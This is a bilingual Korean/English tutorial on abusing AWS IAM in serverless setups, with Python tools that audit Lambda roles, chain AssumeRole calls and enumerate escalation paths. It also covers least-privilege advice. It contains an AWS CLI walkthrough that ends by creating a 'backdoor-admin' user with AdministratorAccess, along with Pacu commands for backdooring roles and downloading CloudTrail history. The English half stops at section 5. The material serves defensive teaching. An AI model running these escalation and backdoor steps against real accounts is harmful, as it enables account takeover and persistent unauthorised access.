> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 서버리스 IAM 권한 남용 — 역할 체인·권한 상승·분석 CLI

## 1. IAM 기초 — 초보자를 위한 설명

### IAM이란?

IAM(Identity and Access Management)은 AWS에서 "누가 무엇을 할 수 있는가"를 제어하는 시스템이다.

**비유:** 회사의 출입 카드 시스템과 같다.
- **사용자(User)** = 직원 개인
- **역할(Role)** = 직급/부서별 출입 권한 (개발자, 관리자, 읽기 전용)
- **정책(Policy)** = 구체적인 접근 규칙 목록 (3층 개발실 출입 가능, 금고실 출입 불가)
- **권한(Permission)** = 개별 규칙 하나하나

```
IAM 구성 요소 관계도

AWS 계정
    │
    ├── 사용자 (IAM User)
    │     - 장기 자격증명 (Access Key + Secret)
    │     - 사람이 직접 사용
    │
    ├── 역할 (IAM Role)
    │     - 임시 자격증명 (STS 토큰)
    │     - Lambda, EC2 등 서비스가 사용
    │     - 사람도 AssumeRole로 사용 가능
    │
    └── 정책 (IAM Policy)
          - 역할/사용자에 부착
          - Allow/Deny 규칙 목록
          - 서비스:액션:리소스 형태
```

### IAM 정책 구조 이해

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",          ← Allow 또는 Deny
      "Action": [                 ← 허용할 작업
        "s3:GetObject",           ← S3에서 객체 읽기
        "s3:PutObject"            ← S3에 객체 쓰기
      ],
      "Resource": [               ← 대상 리소스
        "arn:aws:s3:::my-bucket/*"  ← my-bucket의 모든 객체
      ],
      "Condition": {              ← 조건 (선택적)
        "StringEquals": {
          "aws:RequestedRegion": "ap-northeast-2"
        }
      }
    }
  ]
}
```

### Lambda IAM 역할이란?

Lambda 함수가 AWS 서비스에 접근하려면 "실행 역할(Execution Role)"이 필요하다.

```
Lambda 함수 실행 흐름:

사용자 요청
    │
    ▼
Lambda 함수 시작
    │
    │ STS로 임시 자격증명 발급
    │ (실행 역할의 권한)
    ▼
AWS 서비스 호출 (S3, DynamoDB 등)
    │
    ▼
결과 반환

함수가 s3:GetObject 권한이 없다면 → AccessDenied 오류
```

---

## 2. AWS 권한 상승 경로 — 공격자 관점

### 권한 상승이란?

권한 상승(Privilege Escalation)은 낮은 권한으로 시작해 더 높은 권한을 획득하는 과정이다.

**비유:** 주차장 직원이 주차 허가증만 있는데, 사무실 마스터키를 훔쳐 모든 층에 접근하는 것.

```
AWS IAM 권한 상승 경로 (25가지 이상)

경로 1: PassRole + 서비스 활용
  낮은 권한 → iam:PassRole → 높은 역할을 EC2/Lambda에 부착
  → EC2/Lambda가 높은 권한으로 동작

경로 2: CreatePolicyVersion
  iam:CreatePolicyVersion → 새 버전에 AdministratorAccess 추가
  → 기존 정책을 완전 권한으로 교체

경로 3: AssumeRole
  sts:AssumeRole → 더 높은 권한의 역할을 Assume
  → 체인으로 여러 역할 연결 가능

경로 4: Lambda 역할 탈취
  lambda:InvokeFunction + lambda:GetFunctionConfiguration
  → 높은 권한 Lambda의 실행 역할 자격증명 탈취

경로 5: SetDefaultPolicyVersion
  iam:SetDefaultPolicyVersion → 이미 존재하는 높은 권한 버전을 기본으로 설정
```

### AssumeRole 체인 공격 시각화

```
AssumeRole 체인 공격

시작 (낮은 권한):
  개발자 계정: s3:GetObject만 가능

단계 1:
  sts:AssumeRole → dev-cross-account-role
  획득: S3 + DynamoDB 권한

단계 2:
  sts:AssumeRole → staging-admin-role
  획득: 대부분의 서비스 관리 권한

단계 3:
  sts:AssumeRole → prod-deployer-role
  획득: 프로덕션 환경 배포 권한

최종:
  iam:CreateUser + iam:AttachUserPolicy
  → 새 관리자 계정 생성 → 영구 백도어
```

---

## 3. 서버리스 IAM 위협 모델

Lambda 함수에 과도한 IAM 권한이 부여되면 함수 코드 취약점 하나로 전체 AWS 계정을 장악할 수 있다.

| 공격 시나리오 | 영향 |
|-------------|------|
| Lambda → S3 전체 권한 | 모든 버킷 데이터 탈취 |
| Lambda → IAM 관리 권한 | 새 관리자 계정 생성 |
| Lambda → EC2 권한 | 인스턴스 생성·인스턴스 프로파일 탈취 |
| Lambda → Secrets Manager | 모든 시크릿 탈취 |
| Lambda → STS AssumeRole | 다른 역할 체인으로 권한 상승 |

---

## 4. IAM 역할 분석

```python
#!/usr/bin/env python3
"""Lambda IAM 역할 권한 분석 — 과다 권한 탐지 CLI."""

import argparse
import json
from dataclasses import dataclass, field
from typing import Any
import boto3


DANGEROUS_ACTIONS = {
    # 권한 상승 가능 액션
    "iam:CreateUser", "iam:AttachUserPolicy", "iam:AttachRolePolicy",
    "iam:CreateAccessKey", "iam:CreateLoginProfile",
    "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:SetDefaultPolicyVersion",
    "iam:PassRole", "iam:CreatePolicyVersion",
    "sts:AssumeRole",
    # 데이터 탈취 가능 액션
    "s3:GetObject", "s3:ListAllMyBuckets", "s3:GetBucketPolicy",
    "secretsmanager:GetSecretValue", "ssm:GetParameter", "kms:Decrypt",
    # 실행 관련
    "lambda:InvokeFunction", "lambda:UpdateFunctionCode",
    "ec2:DescribeInstances", "ec2:RunInstances",
    # 로그 조작
    "cloudtrail:DeleteTrail", "cloudtrail:StopLogging",
    "logs:DeleteLogGroup", "logs:DeleteLogStream",
}

WILDCARD_RISK = {"*", "iam:*", "s3:*", "ec2:*", "lambda:*", "sts:*"}


@dataclass
class PolicyFinding:
    function_name: str
    role_arn: str
    policy_name: str
    dangerous_actions: list[str] = field(default_factory=list)
    wildcard_actions: list[str] = field(default_factory=list)
    risk_level: str = "LOW"


def get_lambda_role_policies(function_name: str) -> tuple[str, list[dict]]:
    lambda_client = boto3.client("lambda")
    iam_client = boto3.client("iam")

    # Lambda 역할 ARN 가져오기
    config = lambda_client.get_function_configuration(FunctionName=function_name)
    role_arn = config["Role"]
    role_name = role_arn.split("/")[-1]

    policies = []

    # 인라인 정책
    inline_policies = iam_client.list_role_policies(RoleName=role_name)
    for policy_name in inline_policies["PolicyNames"]:
        doc = iam_client.get_role_policy(RoleName=role_name, PolicyName=policy_name)
        policies.append({"name": policy_name, "document": doc["PolicyDocument"], "type": "inline"})

    # 관리형 정책
    attached = iam_client.list_attached_role_policies(RoleName=role_name)
    for policy in attached["AttachedPolicies"]:
        policy_doc = iam_client.get_policy_version(
            PolicyArn=policy["PolicyArn"],
            VersionId=iam_client.get_policy(PolicyArn=policy["PolicyArn"])["Policy"]["DefaultVersionId"],
        )
        policies.append({
            "name": policy["PolicyName"],
            "document": policy_doc["PolicyVersion"]["Document"],
            "type": "managed",
        })

    return role_arn, policies


def analyze_policy(policy_doc: dict) -> tuple[list[str], list[str]]:
    dangerous: list[str] = []
    wildcards: list[str] = []

    for statement in policy_doc.get("Statement", []):
        if statement.get("Effect") != "Allow":
            continue
        actions = statement.get("Action", [])
        if isinstance(actions, str):
            actions = [actions]

        for action in actions:
            if action in WILDCARD_RISK or action == "*":
                wildcards.append(action)
            elif action in DANGEROUS_ACTIONS:
                dangerous.append(action)

    return dangerous, wildcards


def audit_function(function_name: str) -> PolicyFinding | None:
    try:
        role_arn, policies = get_lambda_role_policies(function_name)
    except Exception as e:
        print(f"오류: {function_name} — {e}")
        return None

    finding = PolicyFinding(function_name=function_name, role_arn=role_arn, policy_name="combined")

    for policy in policies:
        dangerous, wildcards = analyze_policy(policy["document"])
        finding.dangerous_actions.extend(dangerous)
        finding.wildcard_actions.extend(wildcards)

    if finding.wildcard_actions:
        finding.risk_level = "CRITICAL"
    elif len(finding.dangerous_actions) >= 3:
        finding.risk_level = "HIGH"
    elif finding.dangerous_actions:
        finding.risk_level = "MEDIUM"

    return finding


def audit_all_functions(region: str = "ap-northeast-2") -> list[PolicyFinding]:
    lambda_client = boto3.client("lambda", region_name=region)
    findings: list[PolicyFinding] = []

    paginator = lambda_client.get_paginator("list_functions")
    for page in paginator.paginate():
        for func in page["Functions"]:
            finding = audit_function(func["FunctionName"])
            if finding:
                findings.append(finding)

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Lambda IAM 권한 감사")
    sub = parser.add_subparsers(dest="cmd", required=True)

    func_p = sub.add_parser("function", help="특정 함수 감사")
    func_p.add_argument("name", help="Lambda 함수 이름")

    all_p = sub.add_parser("all", help="모든 함수 감사")
    all_p.add_argument("--region", default="ap-northeast-2")
    all_p.add_argument("--min-risk", choices=["LOW", "MEDIUM", "HIGH", "CRITICAL"], default="MEDIUM")

    parser.add_argument("-o", "--output", help="결과 JSON 저장 경로")
    args = parser.parse_args()

    risk_levels = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

    if args.cmd == "function":
        findings = [audit_function(args.name)]
    else:
        findings = audit_all_functions(args.region)
        min_level = risk_levels[args.min_risk]
        findings = [f for f in findings if f and risk_levels[f.risk_level] >= min_level]

    for f in findings:
        if not f:
            continue
        print(f"\n[{f.risk_level}] {f.function_name}")
        print(f"  역할: {f.role_arn}")
        if f.wildcard_actions:
            print(f"  와일드카드: {f.wildcard_actions}")
        if f.dangerous_actions:
            print(f"  위험 권한: {f.dangerous_actions}")

    print(f"\n총 {len([f for f in findings if f])}개 함수 분석 완료")

    if hasattr(args, "output") and args.output:
        with open(args.output, "w") as fp:
            json.dump(
                [vars(f) for f in findings if f],
                fp, indent=2, ensure_ascii=False,
            )


if __name__ == "__main__":
    main()
```

---

## 5. STS AssumeRole 체인 공격

```python
#!/usr/bin/env python3
"""IAM 역할 체인을 통한 권한 상승 경로 탐색 (교육용)."""

import boto3
import json
from typing import Optional


def assume_role_chain(
    role_arns: list[str],
    session_name: str = "audit-session",
) -> dict | None:
    """여러 역할을 체인으로 연결해 최종 자격증명 획득."""
    sts = boto3.client("sts")
    current_creds = None

    for role_arn in role_arns:
        kwargs: dict = {
            "RoleArn": role_arn,
            "RoleSessionName": session_name,
        }

        if current_creds:
            sts = boto3.client(
                "sts",
                aws_access_key_id=current_creds["AccessKeyId"],
                aws_secret_access_key=current_creds["SecretAccessKey"],
                aws_session_token=current_creds["SessionToken"],
            )

        try:
            response = sts.assume_role(**kwargs)
            current_creds = response["Credentials"]
            print(f"[+] AssumeRole 성공: {role_arn}")
        except Exception as e:
            print(f"[-] AssumeRole 실패: {role_arn} — {e}")
            return None

    return current_creds


def enumerate_assumable_roles(
    target_account_id: str,
    current_arn: str,
) -> list[str]:
    """현재 역할에서 AssumeRole 가능한 역할 목록."""
    iam = boto3.client("iam")
    assumable: list[str] = []

    paginator = iam.get_paginator("list_roles")
    for page in paginator.paginate():
        for role in page["Roles"]:
            trust_doc = role["AssumeRolePolicyDocument"]
            for stmt in trust_doc.get("Statement", []):
                principal = stmt.get("Principal", {})
                if isinstance(principal, dict):
                    aws_principal = principal.get("AWS", "")
                elif isinstance(principal, str):
                    aws_principal = principal
                else:
                    continue

                if current_arn in str(aws_principal) or "*" in str(aws_principal):
                    assumable.append(role["Arn"])

    return assumable
```

---

## 6. AWS CLI로 AssumeRole 체인 공격 시연

### 단계별 공격 흐름 (교육용)

```bash
# 사전 조건: 낮은 권한의 IAM 사용자 자격증명
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# 현재 신원 확인
aws sts get-caller-identity
# 출력:
# {
#   "UserId": "AIDAXXXXXXXXXXXXXXXXX",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/dev-user"
# }

# 1단계: dev-cross-account-role Assume (S3 + DynamoDB 권한)
aws sts assume-role \
    --role-arn "arn:aws:iam::123456789012:role/dev-cross-account-role" \
    --role-session-name "pentest-session-1"

# 반환된 임시 자격증명 설정
export AWS_ACCESS_KEY_ID="ASIA..."       # 임시 키
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."           # 세션 토큰 (임시 자격증명 표시)

# 2단계: 더 높은 권한 역할 목록 확인
aws iam list-roles --query 'Roles[*].RoleName' --output text

# 3단계: staging-admin-role Assume
aws sts assume-role \
    --role-arn "arn:aws:iam::123456789012:role/staging-admin-role" \
    --role-session-name "pentest-session-2"

# 4단계: 최종 권한으로 관리자 계정 생성
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy \
    --user-name backdoor-admin \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
aws iam create-access-key --user-name backdoor-admin
```

### 방어: AssumeRole에 조건 추가

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/dev-role"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringEquals": {
          "sts:ExternalId": "unique-external-id-12345",
          "aws:RequestedRegion": "ap-northeast-2"
        },
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}
```

---

## 7. Lambda 실행 역할 남용 — Pacu 도구 사용

### Pacu란?

Pacu는 AWS 침투 테스트 프레임워크다. IAM 열거, 권한 상승, 데이터 탈취 모듈을 포함한다.

```bash
# Pacu 설치
pip install pacu

# Pacu 시작
pacu

# 자격증명 설정
Pacu> set_keys

# IAM 열거
Pacu> run iam__enum_permissions

# 권한 상승 경로 탐색
Pacu> run iam__privesc_scan

# Lambda 역할 탈취
Pacu> run lambda__enum
Pacu> run lambda__backdoor_new_roles

# 결과 확인
Pacu> data IAM
```

### 주요 Pacu 모듈

| 모듈 | 설명 | 사용 시나리오 |
|------|------|-------------|
| `iam__enum_permissions` | 현재 권한 열거 | 초기 정찰 |
| `iam__privesc_scan` | 권한 상승 경로 탐색 | 공격 경로 발견 |
| `lambda__enum` | Lambda 함수 열거 | 공격 표면 파악 |
| `s3__download_bucket` | S3 버킷 다운로드 | 데이터 탈취 |
| `cloudtrail__download_event_history` | CloudTrail 로그 다운로드 | 활동 추적 회피 |

---

## 8. boto3 IAM 열거 스크립트

```python
#!/usr/bin/env python3
"""AWS IAM 환경 종합 열거 도구 — 권한 상승 경로 탐색."""

import argparse
import json
from dataclasses import dataclass, field
from pathlib import Path
import boto3
from botocore.exceptions import ClientError


@dataclass
class IAMInventory:
    """IAM 환경 인벤토리."""
    current_identity: dict = field(default_factory=dict)
    users: list[dict] = field(default_factory=list)
    roles: list[dict] = field(default_factory=list)
    groups: list[dict] = field(default_factory=list)
    policies: list[dict] = field(default_factory=list)
    privilege_escalation_paths: list[dict] = field(default_factory=list)


# 권한 상승 가능한 액션 조합
PRIVESC_PATHS = [
    {
        "name": "PassRole + Lambda",
        "required": {"iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"},
        "description": "높은 권한 역할을 Lambda에 부착하여 코드 실행",
    },
    {
        "name": "CreatePolicyVersion",
        "required": {"iam:CreatePolicyVersion"},
        "description": "기존 정책에 새 버전으로 AdministratorAccess 추가",
    },
    {
        "name": "AssumeRole + AttachRolePolicy",
        "required": {"sts:AssumeRole", "iam:AttachRolePolicy"},
        "description": "역할 Assume 후 높은 권한 정책 부착",
    },
    {
        "name": "CreateLoginProfile",
        "required": {"iam:CreateLoginProfile", "iam:ListUsers"},
        "description": "다른 사용자의 콘솔 패스워드 설정으로 계정 탈취",
    },
    {
        "name": "SetDefaultPolicyVersion",
        "required": {"iam:SetDefaultPolicyVersion"},
        "description": "기존 정책의 높은 권한 버전을 기본으로 설정",
    },
]


def get_current_identity(sts_client) -> dict:
    """현재 자격증명 신원 확인."""
    try:
        return sts_client.get_caller_identity()
    except ClientError as e:
        return {"error": str(e)}


def enumerate_roles_with_trust(iam_client) -> list[dict]:
    """AssumeRole 가능한 역할 열거."""
    roles = []
    try:
        paginator = iam_client.get_paginator("list_roles")
        for page in paginator.paginate():
            for role in page["Roles"]:
                trust = role.get("AssumeRolePolicyDocument", {})
                principals = []
                for stmt in trust.get("Statement", []):
                    p = stmt.get("Principal", {})
                    if isinstance(p, dict):
                        if "AWS" in p:
                            principals.append(("AWS", p["AWS"]))
                        if "Service" in p:
                            principals.append(("Service", p["Service"]))
                    elif isinstance(p, str):
                        principals.append(("*", p))

                roles.append({
                    "RoleName": role["RoleName"],
                    "RoleArn": role["Arn"],
                    "Principals": principals,
                    "CreateDate": str(role.get("CreateDate", "")),
                })
    except ClientError as e:
        print(f"역할 열거 실패: {e}")
    return roles


def get_effective_permissions(iam_client, entity_type: str, entity_name: str) -> set[str]:
    """사용자 또는 역할의 유효 권한 집합 반환."""
    permissions: set[str] = set()

    try:
        if entity_type == "user":
            # 인라인 정책
            inline = iam_client.list_user_policies(UserName=entity_name)
            for policy_name in inline.get("PolicyNames", []):
                doc = iam_client.get_user_policy(
                    UserName=entity_name, PolicyName=policy_name
                )
                permissions.update(extract_actions(doc["PolicyDocument"]))

            # 관리형 정책
            attached = iam_client.list_attached_user_policies(UserName=entity_name)
            for policy in attached.get("AttachedPolicies", []):
                actions = get_managed_policy_actions(iam_client, policy["PolicyArn"])
                permissions.update(actions)

        elif entity_type == "role":
            inline = iam_client.list_role_policies(RoleName=entity_name)
            for policy_name in inline.get("PolicyNames", []):
                doc = iam_client.get_role_policy(
                    RoleName=entity_name, PolicyName=policy_name
                )
                permissions.update(extract_actions(doc["PolicyDocument"]))

            attached = iam_client.list_attached_role_policies(RoleName=entity_name)
            for policy in attached.get("AttachedPolicies", []):
                actions = get_managed_policy_actions(iam_client, policy["PolicyArn"])
                permissions.update(actions)

    except ClientError as e:
        print(f"권한 조회 실패 ({entity_name}): {e}")

    return permissions


def get_managed_policy_actions(iam_client, policy_arn: str) -> set[str]:
    """관리형 정책의 액션 목록."""
    try:
        policy = iam_client.get_policy(PolicyArn=policy_arn)
        version_id = policy["Policy"]["DefaultVersionId"]
        doc = iam_client.get_policy_version(PolicyArn=policy_arn, VersionId=version_id)
        return extract_actions(doc["PolicyVersion"]["Document"])
    except ClientError:
        return set()


def extract_actions(policy_doc: dict) -> set[str]:
    """정책 문서에서 Allow 액션 추출."""
    actions: set[str] = set()
    for stmt in policy_doc.get("Statement", []):
        if stmt.get("Effect") != "Allow":
            continue
        raw = stmt.get("Action", [])
        if isinstance(raw, str):
            raw = [raw]
        actions.update(raw)
    return actions


def find_privesc_paths(permissions: set[str]) -> list[dict]:
    """현재 권한으로 가능한 권한 상승 경로 탐색."""
    paths = []
    # 와일드카드 처리
    has_all = "*" in permissions or "iam:*" in permissions

    for path in PRIVESC_PATHS:
        required = path["required"]
        matched = required.issubset(permissions) or has_all
        if matched:
            paths.append({
                "path": path["name"],
                "description": path["description"],
                "required_actions": list(required),
            })

    return paths


def enumerate_iam_full(region: str = "ap-northeast-2") -> IAMInventory:
    """전체 IAM 환경 열거."""
    session = boto3.Session(region_name=region)
    iam = session.client("iam")
    sts = session.client("sts")

    inventory = IAMInventory()

    # 현재 신원
    inventory.current_identity = get_current_identity(sts)
    print(f"[*] 현재 신원: {inventory.current_identity.get('Arn', '알 수 없음')}")

    # 역할 열거
    print("[*] 역할 열거 중...")
    inventory.roles = enumerate_roles_with_trust(iam)
    print(f"    {len(inventory.roles)}개 역할 발견")

    # 현재 신원의 권한 확인
    arn = inventory.current_identity.get("Arn", "")
    if ":user/" in arn:
        entity_name = arn.split("/")[-1]
        print(f"[*] 권한 열거: {entity_name}")
        permissions = get_effective_permissions(iam, "user", entity_name)
        inventory.privilege_escalation_paths = find_privesc_paths(permissions)

    return inventory


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS IAM 종합 열거")
    sub = parser.add_subparsers(dest="cmd", required=True)

    enum_p = sub.add_parser("enumerate", help="전체 IAM 환경 열거")
    enum_p.add_argument("--region", default="ap-northeast-2")
    enum_p.add_argument("-o", "--output", type=Path)

    privesc_p = sub.add_parser("privesc", help="권한 상승 경로 탐색")
    privesc_p.add_argument("--entity-type", choices=["user", "role"], default="user")
    privesc_p.add_argument("--entity-name", required=True)
    privesc_p.add_argument("--region", default="ap-northeast-2")

    args = parser.parse_args()

    match args.cmd:
        case "enumerate":
            inventory = enumerate_iam_full(args.region)
            print(f"\n[+] IAM 열거 완료")
            print(f"    역할: {len(inventory.roles)}개")
            if inventory.privilege_escalation_paths:
                print(f"\n[!] 권한 상승 경로 발견 ({len(inventory.privilege_escalation_paths)}개):")
                for path in inventory.privilege_escalation_paths:
                    print(f"    [{path['path']}] {path['description']}")
            if args.output:
                data = {
                    "identity": inventory.current_identity,
                    "roles": inventory.roles,
                    "privesc_paths": inventory.privilege_escalation_paths,
                }
                args.output.write_text(json.dumps(data, indent=2, default=str, ensure_ascii=False))

        case "privesc":
            iam = boto3.client("iam", region_name=args.region)
            permissions = get_effective_permissions(iam, args.entity_type, args.entity_name)
            paths = find_privesc_paths(permissions)
            if paths:
                print(f"[!] {len(paths)}개 권한 상승 경로:")
                for p in paths:
                    print(f"  [{p['path']}] {p['description']}")
            else:
                print("[+] 권한 상승 경로 없음")


if __name__ == "__main__":
    main()
```

---

## 9. Lambda 역할 최소 권한 자동 생성

```python
#!/usr/bin/env python3
"""Lambda 함수 코드에서 필요한 AWS 서비스를 분석해 최소 권한 정책 생성."""

import ast
import re
import json
from pathlib import Path
import argparse


# boto3 클라이언트/리소스 호출 → AWS 서비스 매핑
SERVICE_ACTION_MAP = {
    "s3": {
        "get_object": "s3:GetObject",
        "put_object": "s3:PutObject",
        "delete_object": "s3:DeleteObject",
        "list_objects": "s3:ListBucket",
        "list_buckets": "s3:ListAllMyBuckets",
    },
    "dynamodb": {
        "get_item": "dynamodb:GetItem",
        "put_item": "dynamodb:PutItem",
        "delete_item": "dynamodb:DeleteItem",
        "query": "dynamodb:Query",
        "scan": "dynamodb:Scan",
        "update_item": "dynamodb:UpdateItem",
    },
    "secretsmanager": {
        "get_secret_value": "secretsmanager:GetSecretValue",
        "create_secret": "secretsmanager:CreateSecret",
        "delete_secret": "secretsmanager:DeleteSecret",
    },
    "sqs": {
        "send_message": "sqs:SendMessage",
        "receive_message": "sqs:ReceiveMessage",
        "delete_message": "sqs:DeleteMessage",
    },
    "sns": {
        "publish": "sns:Publish",
    },
}


def extract_boto3_calls(filepath: Path) -> set[str]:
    """코드에서 boto3 AWS API 호출 추출."""
    source = filepath.read_text()
    tree = ast.parse(source)
    actions: set[str] = set()

    # boto3.client('service') 패턴 찾기
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        if not (isinstance(node.func, ast.Attribute) and
                isinstance(node.func.value, ast.Name) and
                node.func.value.id == "boto3" and
                node.func.attr in ("client", "resource")):
            continue
        if not node.args:
            continue
        if not isinstance(node.args[0], ast.Constant):
            continue
        service = node.args[0].value.lower()

        # 해당 서비스의 메서드 호출 찾기 (단순 패턴 매칭)
        service_methods = SERVICE_ACTION_MAP.get(service, {})
        for method, action in service_methods.items():
            if method in source:
                actions.add(action)

    return actions


def generate_least_privilege_policy(
    lambda_path: Path,
    account_id: str = "*",
    region: str = "*",
) -> dict:
    """최소 권한 IAM 정책 생성."""
    actions: set[str] = set()

    files = list(lambda_path.rglob("*.py")) if lambda_path.is_dir() else [lambda_path]
    for f in files:
        actions.update(extract_boto3_calls(f))

    # 기본 Lambda 실행 권한
    actions.update(["logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents"])

    policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": sorted(actions),
                "Resource": "*",  # 실제로는 리소스 ARN 특정 권장
            }
        ],
    }
    return policy


def main() -> None:
    parser = argparse.ArgumentParser(description="Lambda 최소 권한 정책 생성")
    parser.add_argument("path", type=Path, help="Lambda 코드 경로")
    parser.add_argument("-o", "--output", type=Path, help="정책 저장 경로")
    args = parser.parse_args()

    policy = generate_least_privilege_policy(args.path)
    output = json.dumps(policy, indent=2, ensure_ascii=False)

    if args.output:
        args.output.write_text(output)
        print(f"정책 저장: {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()
```

---

## 10. 일반적인 잘못 구성된 IAM 정책 예시

### 나쁜 예 vs 좋은 예 비교

```
나쁜 예 1: 전체 S3 권한
{
  "Action": "s3:*",
  "Resource": "*"
}

좋은 예 1: 특정 버킷만
{
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-specific-bucket/*"
}

---

나쁜 예 2: AdministratorAccess 관리형 정책 사용
{
  "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
}

좋은 예 2: 필요한 액션만
{
  "Action": [
    "dynamodb:GetItem",
    "dynamodb:PutItem",
    "sqs:SendMessage"
  ],
  "Resource": [
    "arn:aws:dynamodb:ap-northeast-2:123456789012:table/MyTable",
    "arn:aws:sqs:ap-northeast-2:123456789012:MyQueue"
  ]
}

---

나쁜 예 3: IAM 관련 권한 무분별 부여
{
  "Action": ["iam:*", "sts:*"],
  "Resource": "*"
}

좋은 예 3: 특정 역할 Assume만
{
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::123456789012:role/specific-readonly-role",
  "Condition": {
    "StringEquals": {
      "sts:ExternalId": "known-external-id"
    }
  }
}
```

---

## 11. IAM 보안 모범 사례

| 원칙 | 구현 |
|------|------|
| 최소 권한 | 함수별 전용 역할 — 공유 역할 금지 |
| 리소스 ARN 특정 | `arn:aws:s3:::my-bucket/*` 형식 사용 |
| 조건 키 활용 | `aws:SourceAccount`, `aws:SourceArn` 조건 추가 |
| 권한 경계 | Permission Boundary로 최대 권한 캡 설정 |
| 역할 세션 태깅 | 감사 추적을 위한 세션 태그 부착 |
| 임시 자격증명 | 장기 자격증명 대신 STS 임시 토큰 |
| SCP | AWS Organization SCP로 계정 레벨 가드레일 |
| Access Analyzer | IAM Access Analyzer로 외부 접근 탐지 |

---

<a name="english"></a>

# Serverless IAM Privilege Abuse — Role Chaining, Privilege Escalation, and Analysis CLI

## 1. IAM Basics for Beginners

### What Is IAM?

IAM (Identity and Access Management) is the AWS system that controls "who can do what."

**Analogy:** Think of a company's badge access system.
- **User** = Individual employee
- **Role** = Department-level access (developer, admin, read-only)
- **Policy** = Specific access rule list (can enter 3rd floor dev room, cannot enter vault)
- **Permission** = Each individual rule

```
IAM Component Relationships

AWS Account
    │
    ├── IAM User
    │     - Long-term credentials (Access Key + Secret)
    │     - Used directly by humans
    │
    ├── IAM Role
    │     - Temporary credentials (STS token)
    │     - Used by Lambda, EC2, and other services
    │     - Humans can use via AssumeRole
    │
    └── IAM Policy
          - Attached to roles/users
          - Allow/Deny rule list
          - Service:Action:Resource format
```

### Understanding IAM Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",           <- Allow or Deny
      "Action": [                  <- Actions to permit
        "s3:GetObject",            <- Read objects from S3
        "s3:PutObject"             <- Write objects to S3
      ],
      "Resource": [                <- Target resources
        "arn:aws:s3:::my-bucket/*" <- All objects in my-bucket
      ],
      "Condition": {               <- Condition (optional)
        "StringEquals": {
          "aws:RequestedRegion": "ap-northeast-2"
        }
      }
    }
  ]
}
```

### What Is a Lambda Execution Role?

A Lambda function needs an "Execution Role" to access AWS services.

```
Lambda Function Execution Flow:

User Request
    │
    ▼
Lambda Function Starts
    │
    │ Issues temporary credentials via STS
    │ (using execution role's permissions)
    ▼
Calls AWS Services (S3, DynamoDB, etc.)
    │
    ▼
Returns Result

If function lacks s3:GetObject permission → AccessDenied error
```

---

## 2. AWS Privilege Escalation Paths — Attacker Perspective

### What Is Privilege Escalation?

Privilege escalation is the process of starting with low permissions and acquiring higher ones.

**Analogy:** A parking attendant who has only a parking pass stealing the office master key to access all floors.

```
AWS IAM Privilege Escalation Paths (25+ known paths)

Path 1: PassRole + Service Abuse
  Low permission → iam:PassRole → Attach high-privilege role to EC2/Lambda
  → EC2/Lambda operates with elevated permissions

Path 2: CreatePolicyVersion
  iam:CreatePolicyVersion → Add AdministratorAccess to new version
  → Replace existing policy with full permissions

Path 3: AssumeRole
  sts:AssumeRole → Assume role with higher permissions
  → Chain multiple roles for further escalation

Path 4: Lambda Role Hijacking
  lambda:InvokeFunction + lambda:GetFunctionConfiguration
  → Steal execution role credentials from high-privilege Lambda

Path 5: SetDefaultPolicyVersion
  iam:SetDefaultPolicyVersion → Set existing high-privilege version as default
```

### AssumeRole Chain Attack Visualization

```
AssumeRole Chain Attack

Start (low privilege):
  Developer account: only s3:GetObject

Step 1:
  sts:AssumeRole → dev-cross-account-role
  Gains: S3 + DynamoDB permissions

Step 2:
  sts:AssumeRole → staging-admin-role
  Gains: Most service management permissions

Step 3:
  sts:AssumeRole → prod-deployer-role
  Gains: Production environment deployment permissions

Final:
  iam:CreateUser + iam:AttachUserPolicy
  → Create new admin account → Permanent backdoor
```

---

## 3. Serverless IAM Threat Model

When Lambda functions are granted excessive IAM permissions, a single code vulnerability can lead to full AWS account compromise.

| Attack Scenario | Impact |
|----------------|--------|
| Lambda → Full S3 access | Exfiltrate all bucket data |
| Lambda → IAM management | Create new administrator accounts |
| Lambda → EC2 access | Launch instances, steal instance profiles |
| Lambda → Secrets Manager | Steal all secrets |
| Lambda → STS AssumeRole | Chain roles for privilege escalation |

---

## 4. IAM Role Analysis

The Lambda IAM auditor connects to AWS and examines each Lambda function's execution role for dangerous permissions.

**Risk classification:**
- **CRITICAL**: Wildcard actions (`*`, `iam:*`, `s3:*`, etc.)
- **HIGH**: 3 or more dangerous individual actions
- **MEDIUM**: 1-2 dangerous individual actions
- **LOW**: No dangerous actions detected

**Dangerous actions monitored** include privilege escalation actions (IAM user/policy manipulation, `iam:PassRole`), data exfiltration actions (`s3:GetObject`, `secretsmanager:GetSecretValue`, `kms:Decrypt`), and log tampering actions (`cloudtrail:DeleteTrail`, `logs:DeleteLogGroup`).

**Usage:**
```bash
# Audit specific function
python3 iam_auditor.py function my-lambda-function

# Audit all functions (HIGH+ risk only)
python3 iam_auditor.py all --region us-east-1 --min-risk HIGH -o findings.json
```

---

## 5. STS AssumeRole Chain Attack

